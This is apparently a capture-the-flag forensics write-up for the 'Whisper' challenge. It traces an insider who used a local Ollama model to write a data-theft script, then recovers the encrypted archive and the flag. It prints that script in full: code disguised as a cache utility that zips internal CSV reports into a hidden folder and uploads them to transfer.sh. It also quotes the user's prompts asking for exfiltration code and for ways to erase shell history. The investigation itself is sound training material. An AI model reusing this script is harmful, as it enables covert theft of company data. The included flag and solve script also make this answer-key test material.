# Whisper - Writeup

* **Category:** Forensics
* **Points:** 100
* **Author:** Flagyard
* **Event:** BlackHat MEA Qualification CTF 2026
* **Flag:** `BHFlagY{l0c4l_0ll4m4_llm_f4r3n51c5_2026}`

---

## Executive Summary

**Whisper** is a Linux host forensics challenge involving insider data theft facilitated by a local AI tool (Ollama). The SOC detected an outbound proxy connection attempting to upload encrypted data to `transfer.sh`. The target user (`dwright`) claimed they were testing local AI software. 

Through disk triage of the Linux filesystem, we identified an Ollama installation with interactive prompt history preserved under `/home/dwright/.ollama/history`. The user had instructed Ollama to generate a Python exfiltration script to compress internal CSV reports into an AES-encrypted ZIP file using the passphrase `Gr33nF0x42!D1amond`. Investigating the user's Trash revealed the discarded script `cache_mgr.py`, which derived the archive password using BLAKE2b (`digest_size=32`, truncated to 20 hex characters) and saved the payload to `~/.cache/fontconfig/session.zip`. By replicating the BLAKE2b key derivation, we decrypted `session.zip` using `pyzipper`, inspected `internal_api_keys.csv`, and recovered the base64-encoded flag.

---

## Detailed Analysis & Methodology

### 1. Initial Triage & AI Tool Identification

We are provided with a filesystem triage package `whisper_evidence/` representing a developer's Linux machine.

The challenge description states:
> *"The developer claims they were just testing an AI tool for work. Investigate the system, determine what AI tool was installed, what it was used for, and recover the data that was attempted to be exfiltrated."*

Listing the user directory `/home/dwright` reveals:
- `.ollama/`: Local Ollama AI runner directory
- `.local/share/Trash/`: User's trash folder
- `.cache/`: User cache directories
- `.bash_history`: Truncated/cleaned shell history

Inspecting `/home/dwright/.ollama/history` shows the full command line prompt interaction history between the user and Ollama.

---

### 2. Ollama History Analysis & Passphrase Discovery

Reading `/home/dwright/.ollama/history` reveals typical developer prompts gradually shifting towards data staging and exfiltration:

```text
show me how to create a zip archive in python
how do I create a password protected zip archive using pyzipper
write a python script that reads all csv files from a directory and creates an AES encrypted zip archive
use the password Gr33nF0x42!D1amond
also upload the archive to a remote server using requests and delete the script after successful execution
how do I derive an encryption key from a passphrase using hashlib sha256
how to clean the bash history in terminal so there are no traces
```

Key Findings:
1. The developer prompted the LLM to write a script that reads all CSV files from a directory and creates an AES-encrypted zip using `pyzipper`.
2. The developer explicitly instructed: `use the password Gr33nF0x42!D1amond`.
3. The developer requested an automated upload to a remote server and script deletion.

---

### 3. Locating the Deleted Script (`cache_mgr.py`)

Although the script was deleted to hide traces, checking the FreeDesktop Trash specification location under `/home/dwright/.local/share/Trash/files/` successfully recovers the discarded script:

```bash
cat whisper_evidence/home/dwright/.local/share/Trash/files/cache_mgr.py
```

Content of `cache_mgr.py`:
```python
#!/usr/bin/env python3
"""Cache management utility."""
import os, sys, glob, hashlib
from datetime import datetime

# Import from hidden venv
sys.path.insert(0, os.path.expanduser("~/.local/share/.venv/lib/python3.12/site-packages"))
try:
    import pyzipper
except ImportError:
    sys.exit(1)

raw_key = os.environ.get("CACHE_KEY", "")
if not raw_key:
    sys.exit(1)

# Derive actual encryption key from the raw passphrase
ARCHIVE_PASSWORD = hashlib.blake2b(
    raw_key.encode(),
    digest_size=32
).hexdigest()[:20].encode()

DATA_DIR = os.path.join("/data", "reports")
CACHE_DIR = os.path.join(os.path.expanduser("~"), ".cache", "fontconfig")
OUTPUT_PATH = os.path.join(CACHE_DIR, "session.zip")

def collect_and_archive():
    os.makedirs(CACHE_DIR, exist_ok=True)
    csv_files = glob.glob(os.path.join(DATA_DIR, "*.csv"))
    if not csv_files:
        return None
    with pyzipper.AESZipFile(OUTPUT_PATH, 'w', compression=pyzipper.ZIP_DEFLATED,
                              encryption=pyzipper.WZ_AES) as zf:
        zf.setpassword(ARCHIVE_PASSWORD)
        for fp in csv_files:
            zf.write(fp, os.path.basename(fp))
    return OUTPUT_PATH

def upload(filepath):
    try:
        import requests
        with open(filepath, 'rb') as f:
            requests.put("https://transfer.sh/backup.zip", data=f,
                        headers={"Content-Type": "application/octet-stream"}, timeout=30)
    except:
        pass

if __name__ == "__main__":
    archive = collect_and_archive()
    if archive:
        upload(archive)
```

---

### 4. Key Derivation & Archive Decryption

From `cache_mgr.py`, the archive password derivation algorithm is:
```python
raw_key = "Gr33nF0x42!D1amond"
ARCHIVE_PASSWORD = hashlib.blake2b(
    raw_key.encode(),
    digest_size=32
).hexdigest()[:20].encode()
```

Calculating in Python:
```python
>>> import hashlib
>>> hashlib.blake2b(b"Gr33nF0x42!D1amond", digest_size=32).hexdigest()[:20]
'd571fe77618f54b7fca8'
```

The encrypted archive was written to:
`whisper_evidence/home/dwright/.cache/fontconfig/session.zip`

Using `pyzipper` with password `b'd571fe77618f54b7fca8'`, we open `session.zip` and inspect the contained files:
- `daily_metrics.csv`
- `financial_forecast.csv`
- `internal_api_keys.csv`
- `user_access_logs.csv`

---

### 5. Extracting the Flag

Reading `internal_api_keys.csv`:
```csv
service_name,api_key,environment,last_rotated
payment_gateway,pk_live_9482710492837461,production,2026-05-12
aws_secrets_manager,AKIAIOSFODNN7EXAMPLE,production,2026-04-01
master_vault,QkhGbGFnWXtsMGM0bF8wbGw0bTRfbGxtX2Y0cjNuNTFjNV8yMDI2fQ==,internal,2026-06-15
monitoring_webhook,whsec_9874102938475610,staging,2026-06-01
```

The `master_vault` line holds a base64-encoded token:
`QkhGbGFnWXtsMGM0bF8wbGw0bTRfbGxtX2Y0cjNuNTFjNV8yMDI2fQ==`

Decoding the token:
```bash
echo "QkhGbGFnWXtsMGM0bF8wbGw0bTRfbGxtX2Y0cjNuNTFjNV8yMDI2fQ==" | base64 -d
BHFlagY{l0c4l_0ll4m4_llm_f4r3n51c5_2026}
```

---

## Reproduction Script

Run `python3 solve.py` from the challenge directory:

```python
#!/usr/bin/env python3
import base64
import hashlib
import pathlib
import re
import pyzipper

CHALLENGE_DIR = pathlib.Path(__file__).resolve().parent
evidence_dir = CHALLENGE_DIR / "whisper_evidence"

# 1. Recover passphrase from Ollama history
history_file = evidence_dir / "home/dwright/.ollama/history"
m = re.search(r"use the password\s+(\S+)", history_file.read_text())
raw_password = m.group(1).strip()

# 2. Derive key using BLAKE2b (32 bytes, first 20 hex chars)
archive_password = hashlib.blake2b(
    raw_password.encode("utf-8"),
    digest_size=32
).hexdigest()[:20].encode("utf-8")

# 3. Decrypt staged session.zip from fontconfig cache
zip_path = evidence_dir / "home/dwright/.cache/fontconfig/session.zip"
with pyzipper.AESZipFile(zip_path) as zf:
    zf.setpassword(archive_password)
    csv_data = zf.read("internal_api_keys.csv").decode("utf-8")

# 4. Extract base64 flag from internal_api_keys.csv
for line in csv_data.splitlines():
    if "master_vault" in line:
        b64_key = line.split(",")[1].strip()
        flag = base64.b64decode(b64_key).decode("utf-8")
        print(f"[+] Flag: {flag}")
        break
```

---

## Flag

```text
BHFlagY{l0c4l_0ll4m4_llm_f4r3n51c5_2026}
```
